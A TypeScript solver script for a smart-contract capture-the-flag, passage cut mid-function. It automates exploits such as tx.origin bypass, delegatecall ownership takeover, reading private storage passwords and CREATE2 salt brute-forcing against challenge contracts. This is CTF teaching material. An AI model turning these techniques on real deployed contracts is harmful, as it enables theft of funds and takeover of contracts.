import {
	createPublicClient,
	createWalletClient,
	encodeFunctionData,
	encodeAbiParameters,
	getContract,
	http,
	keccak256,
	toHex,
	hexToBytes,
} from 'viem';
import { privateKeyToAccount, mnemonicToAccount } from 'viem/accounts';
import * as chains from 'viem/chains';
import * as dotenv from 'dotenv';
import { contractsData } from '../contracts/types';
import { deployContract } from 'viem/actions';
import { readFile } from 'fs/promises';
import { dirname, join } from 'path';
import { fileURLToPath } from 'url';

dotenv.config();

// Config: set target chain here if needed (default tries localhost; pass --optimism to switch)
const argIsPresent = (flag: string) => process.argv.includes(flag);
const TARGET_CHAIN = argIsPresent('--optimism')
	? chains.optimism
	: argIsPresent('--base')
	? chains.base
	: chains.hardhat;

const LOCAL_CHAIN_5TH_ACCOUNT_PK =
	'0x8b3a350cf5c34c9194ca85829a2df0ec3153be0318b5e2d3348e872092edffba' as const;

const RUNTIME_PK =
	(process.env.__RUNTIME_DEPLOYER_PRIVATE_KEY as `0x${string}`) ||
	LOCAL_CHAIN_5TH_ACCOUNT_PK;

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);
const ARTIFACTS_ROOT = join(__dirname, '../../hardhat/artifacts/contracts');

type Artifact = { abi: any; bytecode: { object?: string } | string };

const isLocal = TARGET_CHAIN.id === chains.hardhat.id;

// --- Challenge selection via CLI flags ---
// Usage examples:
//   yarn mint-all --only C4            # only Challenge4
//   yarn mint-all --only C4,C7,C12     # run a subset
//   yarn mint-all --skip C8            # run all except Challenge8
// Accepts forms: 4, C4, c4, Challenge4
function parseListArg(flag: string): string[] | undefined {
	// --flag=value
	const withEq = process.argv.find((a) => a.startsWith(`--${flag}=`));
	if (withEq) {
		const v = withEq.split('=')[1]?.trim();
		if (v) return v.split(',').map((s) => s.trim());
	}
	// --flag value
	const i = process.argv.indexOf(`--${flag}`);
	if (i >= 0 && i + 1 < process.argv.length) {
		const v = process.argv[i + 1];
		if (v && !v.startsWith('--')) return v.split(',').map((s) => s.trim());
	}
	return undefined;
}

function canonChallengeName(input: string): string | undefined {
	if (!input) return undefined;
	let s = input.trim();
	if (!s) return undefined;
	s = s.replace(/^challenge/i, '').replace(/^c/i, '');
	const n = parseInt(s, 10);
	if (!Number.isFinite(n) || n <= 0) return undefined;
	return `Challenge${n}`;
}

const onlyList = parseListArg('only');
const skipList = parseListArg('skip');
const onlySet = new Set<string>(
	(onlyList || [])
		.map((x) => canonChallengeName(x)!)
		.filter(Boolean) as string[]
);
const skipSet = new Set<string>(
	(skipList || [])
		.map((x) => canonChallengeName(x)!)
		.filter(Boolean) as string[]
);

function shouldRunChallenge(name: string): boolean {
	// name must be canonical like "Challenge4"
	if (onlySet.size > 0) return onlySet.has(name);
	if (skipSet.has(name)) return false;
	return true;
}

async function runStep(name: string, label: string, fn: () => Promise<void>) {
	if (!shouldRunChallenge(name)) {
		console.log(`ℹ️  ${label} skipped (filtered: ${name})`);
		return;
	}
	await tryTx(label, fn);
}

// Parse a numeric argument: supports "--flag value" or "--flag=value" or env fallbacks elsewhere
function parseNumArg(flag: string): bigint | undefined {
	const withEq = process.argv.find((a) => a.startsWith(`--${flag}=`));
	if (withEq) {
		const v = withEq.split('=')[1]?.trim();
		if (v && /^(0x[0-9a-fA-F]+|\d+)$/.test(v)) return BigInt(v);
	}
	const i = process.argv.indexOf(`--${flag}`);
	if (i >= 0 && i + 1 < process.argv.length) {
		const v = process.argv[i + 1];
		if (v && !v.startsWith('--') && /^(0x[0-9a-fA-F]+|\d+)$/.test(v))
			return BigInt(v);
	}
	return undefined;
}

async function buildClients() {
	const account = privateKeyToAccount(RUNTIME_PK);
	const walletClient = createWalletClient({
		account,
		chain: TARGET_CHAIN,
		transport: http(),
	});
	const publicClient = createPublicClient({
		chain: TARGET_CHAIN,
		transport: http(),
	});
	return { account, walletClient, publicClient };
}

function getChallenge(name: string) {
	const chainContracts = (contractsData as any)[TARGET_CHAIN.id];
	if (!chainContracts || !chainContracts[name]) return undefined;
	return chainContracts[name];
}

async function tryTx<T>(label: string, fn: () => Promise<T>) {
	try {
		const res = await fn();
		// If the inner function threw a SKIP error, we won't reach here.
		console.log(`✅ ${label}`);
		return res;
	} catch (err: any) {
		const msg = err?.shortMessage || err?.message || err;
		if (typeof msg === 'string' && msg.startsWith('SKIP:')) {
			console.log(`ℹ️  ${label} ${msg.substring(5).trim()}`);
		} else {
			console.log(`⚠️  ${label} skipped/failed:`, msg);
		}
	}
}

function skip(reason: string): never {
	throw new Error(`SKIP: ${reason}`);
}

async function loadArtifact(
	contractName: string,
	fileBase: string
): Promise<Artifact> {
	const p = join(ARTIFACTS_ROOT, fileBase, `${contractName}.json`);
	const raw = await readFile(p, 'utf-8');
	return JSON.parse(raw) as Artifact;
}

async function deploySolution(
	walletClient: any,
	publicClient: any,
	contractName: string,
	fileBase: string,
	args: any[] = []
): Promise<`0x${string}`> {
	const artifact = await loadArtifact(contractName, fileBase);
	const abi = (artifact as any).abi;
	const bytecode =
		typeof (artifact as any).bytecode === 'string'
			? (artifact as any).bytecode
			: (artifact as any).bytecode.object;
	if (!bytecode) throw new Error(`Missing bytecode for ${contractName}`);
	const hash: `0x${string}` = await walletClient.deployContract({
		abi,
		bytecode,
		args,
	});
	const rcpt = await publicClient.waitForTransactionReceipt({ hash });
	const addr = rcpt.contractAddress as `0x${string}` | undefined;
	if (!addr) throw new Error(`Failed to deploy ${contractName}`);
	return addr;
}

async function main() {
	const { account, walletClient, publicClient } = await buildClients();
	console.log(`Target chain: ${TARGET_CHAIN.name} (${TARGET_CHAIN.id})`);
	console.log(`Using account: ${account.address}`);

	const wait = async (hash: `0x${string}`) =>
		publicClient.waitForTransactionReceipt({ hash }).catch(() => undefined);

	// Helper to get a viem contract instance
	const contract = (name: string) => {
		const decl = getChallenge(name);
		if (!decl) return undefined;
		return getContract({
			address: decl.address,
			abi: decl.abi,
			client: { public: publicClient, wallet: walletClient },
		});
	};

	// C1: registerMe(string)
	await runStep(
		'Challenge1',
		"Challenge1.registerMe('Builder')",
		async () => {
			const c = contract('Challenge1');
			if (!c)
				throw new Error(
					'No Challenge1 on this chain. Run `yarn deploy --tags CTF`.'
				);
			const hash = await c.write.registerMe(['Builder']);
			await wait(hash);
		}
	);

	// C2: justCallMe() requires a contract call (msg.sender != tx.origin). Use helper on localhost; fallback to raw helper on live.
	await runStep(
		'Challenge2',
		'Challenge2.justCallMe() via helper contract',
		async () => {
			const c2 = getChallenge('Challenge2');
			if (!c2) throw new Error('No Challenge2 on this chain');
			let helper = getChallenge('Challenge2Solution');
			if (!helper && isLocal) {
				// auto-deploy helper locally
				const addr = await deploySolution(
					walletClient,
					publicClient,
					'Challenge2Solution',
					'Challenge2Solution.sol'
				);
				helper = {
					address: addr,
					abi: (
						await loadArtifact(
							'Challenge2Solution',
							'Challenge2Solution.sol'
						)
					).abi,
				} as any;
			}
			if (helper) {
				const h = getContract({
					address: helper.address,
					abi: helper.abi,
					client: { public: publicClient, wallet: walletClient },
				});
				const hash = await (h as any).write.solve([c2.address]);
				await wait(hash);
			} else {
				// Fallback: raw bytecode proxy approach (best-effort)
				const helperRuntime =
					'0x602a60003660007300000000000000000000000000000000000000005af160005b00';
				const deployTx = await walletClient.sendTransaction({
					account,
					data: helperRuntime,
				});
				const depRcpt = await wait(deployTx as `0x${string}`);
				const helperAddr = depRcpt?.contractAddress as
					| `0x${string}`
					| undefined;
				if (!helperAddr) throw new Error('Helper deployment failed');
				const selector = '0x2da71776' as const; // justCallMe()
				const data = (c2.address + selector.slice(2)) as `0x${string}`;
				const callTx = await walletClient.sendTransaction({
					account,
					to: helperAddr,
					data,
				});
				await wait(callTx as `0x${string}`);
			}
		}
	);

	// C3: constructor-call helper (deployed via helpers tag)
	await runStep(
		'Challenge3',
		'Challenge3.mintFlag() via constructor-call helper',
		async () => {
			const c3 = getChallenge('Challenge3');
			if (!c3)
				skip(
					'No Challenge3 on this chain. Run `yarn deploy --tags CTF`.'
				);
			let helper = getChallenge('Challenge3Solution');
			if (!helper && isLocal) {
				const addr = await deploySolution(
					walletClient,
					publicClient,
					'Challenge3Solution',
					'Challenge3Solution.sol',
					[c3.address]
				);
				helper = {
					address: addr,
					abi: (
						await loadArtifact(
							'Challenge3Solution',
							'Challenge3Solution.sol'
						)
					).abi,
				} as any;
			}
			if (!helper)
				skip(
					'Challenge3Solution not found. Run: yarn deploy --tags solution3.'
				);
			console.log(
				'ℹ️  Challenge3Solution was deployed; its constructor already attempted the mint.'
			);
		}
	);

	// C4: if we're owner or already minter, add self as minter then sign and mint
	await runStep(
		'Challenge4',
		'Challenge4.addMinter + mintFlag(signature)',
		async () => {
			const c4decl = getChallenge('Challenge4');
			if (!c4decl)
				skip(
					'No Challenge4 on this chain. Run `yarn deploy --tags CTF`.'
				);
			const c4 = getContract({
				address: c4decl.address,
				abi: c4decl.abi,
				client: { public: publicClient, wallet: walletClient },
			});
			// Follow forked solution: use a designated minter key to sign for the deployer (msg.sender)
			// Default to local Anvil/Hardhat mnemonic index 12; allow override via CH4_MINTER_PK
			const MINTER_PK =
				(process.env.C4_MINTER as `0x${string}`) || undefined;
			let minterAccount = MINTER_PK
				? privateKeyToAccount(MINTER_PK)
				: mnemonicToAccount(
						// Hardhat/Anvil default mnemonic
						'test test test test test test test test test test test junk',
						{ path: "m/44'/60'/0'/0/12" }
				  );
			// Build message: keccak256(abi.encode("BG CTF Challenge 4", deployerAddress))
			const encoded = encodeAbiParameters(
				[{ type: 'string' }, { type: 'address' }],
				['BG CTF Challenge 4', account.address as `0x${string}`]
			);
			const digest = keccak256(encoded);
			// Sign using the MINTER account (EIP-191 personal sign over 32-byte hash)
			const sig = await walletClient.signMessage({
				account: minterAccount,
				message: { raw: digest as `0x${string}` },
			});
			// Call mintFlag(minter, sig) from the deployer wallet (msg.sender = deployer)
			const mintTx = await (c4 as any).write.mintFlag([
				minterAccount.address,
				sig,
			]);
			await wait(mintTx);
		}
	);

	// C5: use helper if deployed locally
	await runStep('Challenge5', 'Challenge5Solution.attack()', async () => {
		let helper = getChallenge('Challenge5Solution');
		if (!helper && isLocal) {
			const ch5 = getChallenge('Challenge5');
			if (!ch5)
				skip(
					'No Challenge5 on this chain. Run `yarn deploy --tags CTF`.'
				);
			const addr = await deploySolution(
				walletClient,
				publicClient,
				'Challenge5Solution',
				'Challenge5Solution.sol',
				[ch5.address]
			);
			helper = {
				address: addr,
				abi: (
					await loadArtifact(
						'Challenge5Solution',
						'Challenge5Solution.sol'
					)
				).abi,
			} as any;
		}
		if (!helper)
			skip(
				'Challenge5Solution not found. Run: yarn deploy --tags solution5.'
			);
		const h = getContract({
			address: helper.address,
			abi: helper.abi,
			client: { public: publicClient, wallet: walletClient },
		});
		const hash = await (h as any).write.attack([]);
		await wait(hash);
	});

	// C6: compute code = count << 8 and call via solution
	await runStep('Challenge6', 'Challenge6Solution.solve(code)', async () => {
		const ch6 = getChallenge('Challenge6');
		let sol = getChallenge('Challenge6Solution');
		if (!ch6 || !sol)
			skip(
				'Challenge6 or its solution not found. Run: yarn deploy --tags solution6.'
			);
		if (!sol && isLocal) {
			const addr = await deploySolution(
				walletClient,
				publicClient,
				'Challenge6Solution',
				'Challenge6Solution.sol',
				[ch6.address]
			);
			sol = {
				address: addr,
				abi: (
					await loadArtifact(
						'Challenge6Solution',
						'Challenge6Solution.sol'
					)
				).abi,
			} as any;
		}
		const c6 = getContract({
			address: ch6.address,
			abi: ch6.abi,
			client: { public: publicClient },
		});
		const preCount: bigint = await (c6 as any).read.count([]);
		const code = (preCount << 8n) as bigint;
		const s = getContract({
			address: sol.address,
			abi: sol.abi,
			client: { public: publicClient, wallet: walletClient },
		});
		console.log(
			`ℹ️  C6 using target ${ch6.address}, solution ${sol.address}, preCount=${preCount}, code=${code}`
		);
		const tx = await (s as any).write.solve([code]);
		await wait(tx);
		const postCount: bigint = await (c6 as any).read.count([]);
		if (postCount !== preCount + 1n) {
			throw new Error(
				`C6 did not mint. preCount=${preCount} postCount=${postCount}. Ensure solution6 is deployed/exported and gas window satisfied.`
			);
		}
	});

	// C7: claimOwnership via fallback->delegatecall, then mint. Use raw selector call.
	await runStep(
		'Challenge7',
		'Challenge7.claimOwnership() via fallback',
		async () => {
			const c7 = getChallenge('Challenge7');
			if (!c7)
				throw new Error(
					'Challenge7 missing on this chain. Run `yarn deploy --tags CTF`.'
				);
			// Read delegate from storage slot 1 and verify it has code
			try {
				const raw = await publicClient.getStorageAt({
					address: c7.address as `0x${string}`,
					slot: '0x1',
				});
				if (raw) {
					const delegateAddr = ('0x' +
						raw.slice(-40)) as `0x${string}`;
					const code = await publicClient.getCode({
						address: delegateAddr,
					});
					if (!code || code === '0x') {
						console.log(
							'ℹ️  Challenge7 delegate has no code at',
							delegateAddr,
							'— cannot claim.'
						);
						skip('delegate contract missing code');
					}
				}
			} catch {}
			// Build calldata using ABI to avoid selector mismatch
			const claimData = encodeFunctionData({
				abi: [
					{
						name: 'claimOwnership',
						type: 'function',
						stateMutability: 'nonpayable',
						inputs: [],
						outputs: [],
					},
				] as const,
				functionName: 'claimOwnership',
				args: [],
			});
			// Log current owner
			const beforeOwner: string = await (
				getContract({
					address: c7.address,
					abi: c7.abi,
					client: { public: publicClient },
				}) as any
			).read.owner([]);
			for (let i = 0; i < 3; i++) {
				const tx = await walletClient.sendTransaction({
					account,
					to: c7.address,
					data: claimData,
				});
				await wait(tx as `0x${string}`);
				const c = getContract({
					address: c7.address,
					abi: c7.abi,
					client: { public: publicClient },
				});
				const owner: string = await (c as any).read.owner([]);
				if (owner.toLowerCase() === account.address.toLowerCase())
					break;
				await new Promise((r) => setTimeout(r, 200));
			}
			const afterOwner: string = await (
				getContract({
					address: c7.address,
					abi: c7.abi,
					client: { public: publicClient },
				}) as any
			).read.owner([]);
			if (afterOwner.toLowerCase() !== account.address.toLowerCase()) {
				console.log(
					'ℹ️  Challenge7 owner before:',
					beforeOwner,
					'after:',
					afterOwner
				);
			}
		}
	);

	// C9: read private storage password (slot 1) and compute masked value for current count
	await runStep(
		'Challenge9',
		'Challenge9.mintFlag(maskedPassword)',
		async () => {
			const c9 = getChallenge('Challenge9');
			if (!c9) throw new Error('No Challenge9 on this chain');
			// password at slot 1 (nftContract at slot 0, bytes32 password at 1)
			const raw = await publicClient.getStorageAt({
				address: c9.address as `0x${string}`,
				slot: '0x1',
			});
			if (!raw) throw new Error('Could not read password slot');
			const password = BigInt(raw);
			const countSlot = await publicClient.getStorageAt({
				address: c9.address as `0x${string}`,
				slot: '0x2',
			});
			if (!countSlot) throw new Error('Could not read count slot');
			const count = Number(BigInt(countSlot));
			const byteIndex = 31 - (count % 32);
			const mask =
				~(BigInt(0xff) << BigInt(byteIndex * 8)) & ((1n << 256n) - 1n);
			const newPassword = password & mask;
			const arg = `0x${newPassword
				.toString(16)
				.padStart(64, '0')}` as `0x${string}`;
			const c = getContract({
				address: c9.address,
				abi: c9.abi,
				client: { public: publicClient, wallet: walletClient },
			});
			const hash = await (c as any).write.mintFlag([arg]);
			await wait(hash);
		}
	);

	// C10: Give 1 Get 1 — send your Challenge #1 token to NFTFlags with data = your Challenge #9 tokenId.
	await runStep(
		'Challenge10',
		'NFTFlags Give 1 Get 1 (mint #10)',
		async () => {
			// Resolve NFTFlags
			let nfDecl = getChallenge('NFTFlags');
			let nftAddr: `0x${string}` | undefined;
			let nftAbi: any | undefined;
			if (nfDecl) {
				nftAddr = nfDecl.address as `0x${string}`;
				nftAbi = nfDecl.abi;
			} else {
				// Fallback: read from Challenge1.nftContract and load ABI from artifacts
				const c1 = getChallenge('Challenge1');
				if (!c1)
					skip(
						'NFTFlags not exported and Challenge1 missing; cannot infer NFT address.'
					);
				const c1c = getContract({
					address: c1.address,
					abi: c1.abi,
					client: { public: publicClient },
				});
				nftAddr = (await (c1c as any).read.nftContract(
					[]
				)) as `0x${string}`;
				nftAbi = (await loadArtifact('NFTFlags', 'NFTFlags.sol')).abi;
			}
			const nf = getContract({
				address: nftAddr!,
				abi: nftAbi!,
				client: { public: publicClient, wallet: walletClient },
			});
			// Find your tokenIds for challenges 1 and 9, or accept overrides
			let token1: bigint | undefined = parseNumArg('c10-token1');
			let token9: bigint | undefined = parseNumArg('c10-token9');
			if (!token1 || !token9) {
				const total: bigint = await (nf as any).read.tokenIdCounter([]);
				for (let id = 1n; id <= total; id++) {
					const cid: bigint = await (
						nf as any
					).read.tokenIdToChallengeId([id]);
					if ((cid === 1n && !token1) || (cid === 9n && !token9)) {
						const owner: string = await (nf as any).read.ownerOf([
							id,
						]);
						if (
							owner.toLowerCase() ===
							account.address.toLowerCase()
						) {
							if (cid === 1n) token1 = id;
							if (cid === 9n) token9 = id;
							if (token1 && token9) break;
						}
					}
				}
			}
			if (!token1 || !token9)
				skip(
					'Need to own both challenge #1 and #9 tokens to mint #10 (Give 1 Get 1).'
				);
			console.log(
				`ℹ️  C10 using NFTFlags ${nftAddr}, token1=${token1}, token9=${token9}`
			);
			const data = encodeAbiParameters([{ type: 'uint256' }], [token9!]);
			const tx = await (nf as any).write.safeTransferFrom([
				account.address,
				nftAddr!,
				token1!,
				data,
			]);
			await wait(tx);
			const got10: boolean = await (nf as any).read.hasMinted([
				account.address,
				10n,
			]);
			if (!got10) throw new Error('Challenge #10 did not mint.');
		}
	);

	// C11: suggest factory path
	await runStep(
		'Challenge11',
		'Challenge11.create2 caller + mint',
		async () => {
			const ch11 = getChallenge('Challenge11');
			if (!ch11)
				skip(
					'No Challenge11 on this chain. Run `yarn deploy --tags CTF`.'
				);
			// ensure factory exists (deploy locally if needed)
			let factory = getChallenge('Challenge11Factory');
			if (!factory && isLocal) {
				const addr = await deploySolution(
					walletClient,
					publicClient,
					'Challenge11Factory',
					'Challenge11Factory.sol'
				);
				factory = {
					address: addr,
					abi: (
						await loadArtifact(
							'Challenge11Factory',
							'Challenge11Factory.sol'
						)
					).abi,
				} as any;
			}
			if (!factory)
				skip(
					'Challenge11Factory not found. Run: yarn deploy --tags solution11.'
				);
			// prepare creation code for Challenge11Caller(target)
			const callerArt = await loadArtifact(
				'Challenge11Caller',
				'Challenge11Factory.sol'
			);
			const ctorData = encodeAbiParameters(
				[{ type: 'address' }],
				[ch11.address as `0x${string}`]
			);
			const bytecode =
				typeof (callerArt as any).bytecode === 'string'
					? (callerArt as any).bytecode
					: (callerArt as any).bytecode.object;
			if (!bytecode)
				throw new Error('Missing Challenge11Caller bytecode');
			const creation = (bytecode as string) + ctorData.slice(2);
			// target mask
			const originLast = Number(
				hexToBytes(account.address as `0x${string}`)[19]
			);
			const targetMask = originLast & 0x15;
			// brute salts
			const facAddr = factory.address as `0x${string}`;
			const creationHash = keccak256(creation as `0x${string}`);
			let salt: `0x${string}` | undefined;
			let childAddr: `0x${string}` | undefined;
			for (let i = 0; i < 4096; i++) {
				const s = toHex(i, { size: 32 });
				const preimage = ('0xff' +
					facAddr.slice(2) +
					s.slice(2) +
					creationHash.slice(2)) as `0x${string}`;
				const addrHash = keccak256(preimage);
				const predicted = ('0x' + addrHash.slice(-40)) as `0x${string}`;
				const last = Number(hexToBytes(predicted)[19]);
				if ((last & 0x15) === targetMask) {
					salt = s as `0x${string}`;
					childAddr = predicted;
					break;
				}
			}
			if (!salt || !childAddr)
				skip('No matching salt found within search window.');
			// deploy via factory
			const f = getContract({
				address: facAddr,
				abi: factory.abi,
				client: { public: publicClient, wallet: walletClient },
			});
			const txHash = await (f as any).write.deployWithSalt([
				salt,
				creation as `0x${string}`,
			]);
			await wait(txHash);
			// call caller to mint
			const caller = getContract({
				address: childAddr,
				abi: callerArt.abi,
				client: { public: publicClient, wallet: walletClient },
			});
			const mintTx = await (caller as any).write.callMint([]);
			await wait(mintTx);
		}
	);

	// C12: two-step premint + supply RLP header of a future block. We'll do the premint step to get you started.
	// Minimal RLP utilities to encode header precisely
	const beFromBigInt = (n: bigint) => {
		if (n === 0n) return new Uint8Array([]);
		let hex = n.toString(16);
		if (hex.length % 2) hex = '0' + hex;
		return hexToBytes(('0x' + hex) as `0x${string}`);
	};
	const rlpEncodeBytes = (bytes: Uint8Array) => {
		const len = bytes.length;
		if (len === 1 && bytes[0] < 0x80) return bytes;
		if (len <= 55) {
			const out = new Uint8Array(1 + len);
			out[0] = 0x80 + len;
			out.set(bytes, 1);
			return out;
		}
		// long string
		let lhex = len.toString(16);
		if (lhex.length % 2) lhex = '0' + lhex;
		const lbytes = hexToBytes(('0x' + lhex) as `0x${string}`);
		const out = new Uint8Array(1 + lbytes.length + len);
		out[0] = 0xb7 + lbytes.length;
		out.set(lbytes, 1);
		out.set(bytes, 1 + lbytes.length);
		return out;
	};
	const rlpEncodeInt = (n: bigint) => rlpEncodeBytes(beFromBigInt(n));
	const rlpConcat = (parts: Uint8Array[]) => {
		let total = 0;
		for (const p of parts) total += p.length;
		const out = new Uint8Array(total);
		let o = 0;
		for (const p of parts) {
			out.set(p, o);
			o += p.length;
		}
		return out;
	};

	// Try to fetch raw header/block RLP via non-standard RPCs and extract header RLP if possible
	async function tryGetRawHeaderRlp(
		blockHash: `0x${string}`,
		blockNumberHex: `0x${string}`
	): Promise<`0x${string}` | undefined> {
		const tryMethods: Array<{
			method: string;
			params: any[];
			description: string;
		}> = [
			{
				method: 'debug_getRawHeader',
				params: [blockHash],
				description: 'raw header by hash',
			},
			{
				method: 'debug_getRawBlock',
				params: [blockHash],
				description: 'raw block by hash',
			},
			{
				method: 'debug_getBlockRlp',
				params: [blockNumberHex],
				description: 'raw block by number',
			},
		];
		const isHex = (v: any): v is `0x${string}` =>
			typeof v === 'string' && /^0x[0-9a-fA-F]*$/.test(v);
		for (const t of tryMethods) {
			try {
				const raw: any = await (publicClient as any).request({
					method: t.method,
					params: t.params,
				});
				if (!isHex(raw)) continue;
				// If it's a header RLP already, it should start with list prefix (0xc0-0xff)
				// If it's a full block RLP (list of [header, txs, uncles]), extract first element
				const bytes = hexToBytes(raw as `0x${string}`);
				if (bytes.length === 0) continue;
				const b0 = bytes[0];
				const isList = b0 >= 0xc0;
				if (!isList) continue;
				// Decode list payload
				let offset = 0;
				let payloadOffset = 0;
				let payloadLen = 0;
				if (b0 <= 0xf7) {
					payloadOffset = 1;
					payloadLen = b0 - 0xc0;
				} else {
					const lsize = b0 - 0xf7; // number of length bytes
					payloadOffset = 1 + lsize;
					let len = 0;
					for (let i = 0; i < lsize; i++)
						len = (len << 8) | bytes[1 + i];
					payloadLen = len;
				}
				// First item length at payloadOffset
				offset = payloadOffset;
				const first = bytes[offset];
				let itemLen = 0;
				if (first < 0x80) itemLen = 1;
				else if (first < 0xb8) itemLen = 1 + (first - 0x80);
				else if (first < 0xc0) {
					const l = first - 0xb7;
					let len = 0;
					for (let i = 0; i < l; i++)
						len = (len << 8) | bytes[offset + 1 + i];
					itemLen = 1 + l + len;
				} else if (first < 0xf8) itemLen = 1 + (first - 0xc0);
				else {
					const l = first - 0xf7;
					let len = 0;
					for (let i = 0; i < l; i++)
						len = (len << 8) | bytes[offset + 1 + i];
					itemLen = 1 + l + len;
				}
				const headerSlice = bytes.slice(offset, offset + itemLen);
				const rlpHeader = toHex(headerSlice) as `0x${string}`;
				return rlpHeader;
			} catch (e) {
				// ignore and try next method
			}
		}
		return undefined;
	}
	const rlpEncodeList = (items: Uint8Array[]) => {
		const payload = rlpConcat(items);
		const len = payload.length;
		if (len <= 55) {
			const out = new Uint8Array(1 + len);
			out[0] = 0xc0 + len;
			out.set(payload, 1);
			return out;
		}
		let lhex = len.toString(16);
		if (lhex.length % 2) lhex = '0' + lhex;
		const lbytes = hexToBytes(('0x' + lhex) as `0x${string}`);
		const out = new Uint8Array(1 + lbytes.length + len);
		out[0] = 0xf7 + lbytes.length;
		out.set(lbytes, 1);
		out.set(payload, 1 + lbytes.length);
		return out;
	};

	// Build header strictly by era rules (Genesis->London, London->Paris, Paris->Shanghai, Shanghai->Cancún, Cancún->Now)
	function buildEraHeaderRlp(block: any): `0x${string}` | undefined {
		const EMPTY_UNCLES_HASH =
			'0x1dcc4de8dec75d7aab85b567b6ccd41ad2bfaa20c2a96d1b7f9fbe6a6f6c5b3c' as const;
		const EMPTY_TRIE_HASH =
			'0x56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421' as const;
		const toBytesFixed = (v: any, size: number) => {
			let h = (v || '0x') as `0x${string}`;
			let hex = h.slice(2);
			const target = size * 2;
			if (hex.length > target) hex = hex.slice(hex.length - target);
			return hexToBytes(
				`0x${hex.padStart(target, '0')}` as `0x${string}`
			);
		};
		const normBloomHex = (v: any) => {
			let h = (v || '0x') as `0x${string}`;
			const hex = h === '0x' ? '' : h.slice(2);
			return ('0x' + hex.padStart(512, '0')) as `0x${string}`;
		};
		const b32 = (v: any) => rlpEncodeBytes(toBytesFixed(v, 32));
		const b20 = (v: any) => rlpEncodeBytes(toBytesFixed(v, 20));
		const bInt = (v: any) => rlpEncodeInt(BigInt(v ?? 0));
		const bBytes = (v: any) =>
			rlpEncodeBytes(hexToBytes((v || '0x') as `0x${string}`));
		const beneficiary =
			block.beneficiary ||
			block.miner ||
			block.coinbase ||
			block.feeRecipient ||
			'0x' + '0'.repeat(40);
		const randaoOrMix = block.prevRandao ?? block.mixHash ?? '0x';
		const base: Uint8Array[] = [
			b32(block.parentHash),
			b32(block.sha3Uncles || EMPTY_UNCLES_HASH),
			b20(beneficiary),
			b32(block.stateRoot),
			b32(block.transactionsRoot || EMPTY_TRIE_HASH),
			b32(block.receiptsRoot || EMPTY_TRIE_HASH),
			rlpEncodeBytes(hexToBytes(normBloomHex(block.logsBloom))),
			bInt(
				block.baseFeePerGas !== undefined &&
					block.baseFeePerGas !== null
					? 0n
					: block.difficulty ?? 0n
			),
			bInt(block.number ?? 0n),
			bInt(block.gasLimit ?? 0n),
			bInt(block.gasUsed ?? 0n),
			bInt(block.timestamp ?? 0n),
			bBytes(block.extraData || '0x'),
			b32(randaoOrMix),
		];

		// Era fences (mainnet numbers; we still use field presence to pick shape)
		const hasBaseFee =
			block.baseFeePerGas !== undefined && block.baseFeePerGas !== null;
		const hasWithdrawals = !!block.withdrawalsRoot;
		const hasBlobs =
			block.blobGasUsed !== undefined ||
			block.excessBlobGas !== undefined;
		const hasPBBR = !!block.parentBeaconBlockRoot;

		// London -> Paris and Genesis -> London include baseFee (London) vs not, and nonce varies pre-merge.
		// Post-merge (Paris+) nonce must be 0x000...00 (16 zero bytes) per tutorial.
		const postMergeNonce = '0x0000000000000000';
		const preMergeNonce = (block.nonce ||
			'0x0000000000000000') as `0x${string}`;

		if (hasBaseFee && hasWithdrawals && hasBlobs && hasPBBR) {
			// Cancún -> Now (Deneb)
			const header = [
				...base,
				rlpEncodeBytes(hexToBytes(postMergeNonce as `0x${string}`)),
				bInt(block.baseFeePerGas),
				b32(block.withdrawalsRoot),
				bInt(block.blobGasUsed ?? 0n),
				bInt(block.excessBlobGas ?? 0n),
				b32(block.parentBeaconBlockRoot),
			];
			return toHex(rlpEncodeList(header));
		}
		if (hasBaseFee && hasWithdrawals && !hasBlobs) {
			// Shanghai -> Cancún
			const header = [
				...base,
				rlpEncodeBytes(hexToBytes(postMergeNonce as `0x${string}`)),
				bInt(block.baseFeePerGas),
				b32(block.withdrawalsRoot),
			];
			return toHex(rlpEncodeList(header));
		}
		if (hasBaseFee && !hasWithdrawals) {
			// Paris -> Shanghai
			const header = [
				...base,
				rlpEncodeBytes(hexToBytes(postMergeNonce as `0x${string}`)),
				bInt(block.baseFeePerGas),
			];
			return toHex(rlpEncodeList(header));
		}
		if (!hasBaseFee) {
			// Genesis -> London (pre-London)
			const header = [
				...base,
				rlpEncodeBytes(hexToBytes(preMergeNonce as `0x${string}`)),
			];
			return toHex(rlpEncodeList(header));
		}
		return undefined;
	}

	// Build a single header RLP variant (London/Shanghai/Cancún + a few value toggles for L2s)
	const buildHeaderRlpVariant = (
		b: any,
		opts: {
			includeBaseFee: boolean;
			includeWithdrawals: boolean;
			includeBlob: boolean;
			includePBBR: boolean;
			forceDifficultyZero?: boolean;
			nonceEmpty?: boolean;
			preferPrevRandao?: boolean;
			pbbrBeforeBlob?: boolean;
		}
	): `0x${string}` => {
		const asBig = (v: any): bigint => {
			if (typeof v === 'bigint') return v;
			if (typeof v === 'number') return BigInt(v);
			if (typeof v === 'string') return BigInt(v);
			if (v === null || v === undefined) return 0n;
			try {
				return BigInt(v);
			} catch {
				return 0n;
			}
		};
		const hexOrEmpty = (v: any) =>
			v && v !== '0x' ? (v as `0x${string}`) : ('0x' as const);
		const zero20 = '0x' + '0'.repeat(40);
		const pickBeneficiary = (b: any) =>
			(b.beneficiary ||
				b.miner ||
				b.coinbase ||
				b.feeRecipient ||
				zero20) as `0x${string}`;
		const toBytesFixed = (v: any, size: number) => {
			let h = hexOrEmpty(v);
			let hex = h.slice(2);
			const target = size * 2;
			if (hex.length > target) hex = hex.slice(hex.length - target);
			return hexToBytes(
				('0x' + hex.padStart(target, '0')) as `0x${string}`
			);
		};
		const normBloom = (v: any) => {
			let h = hexOrEmpty(v);
			if (h === '0x') return ('0x' + '0'.repeat(512)) as `0x${string}`;
			const hex = h.slice(2);
			if (hex.length < 512)
				return ('0x' + hex.padStart(512, '0')) as `0x${string}`;
			return h as `0x${string}`;
		};
		const fields: Uint8Array[] = [
			rlpEncodeBytes(toBytesFixed(b.parentHash, 32)),
			rlpEncodeBytes(toBytesFixed(b.sha3Uncles, 32)),
			rlpEncodeBytes(toBytesFixed(pickBeneficiary(b), 20)),
			rlpEncodeBytes(toBytesFixed(b.stateRoot, 32)),
			rlpEncodeBytes(toBytesFixed(b.transactionsRoot, 32)),
			rlpEncodeBytes(toBytesFixed(b.receiptsRoot, 32)),
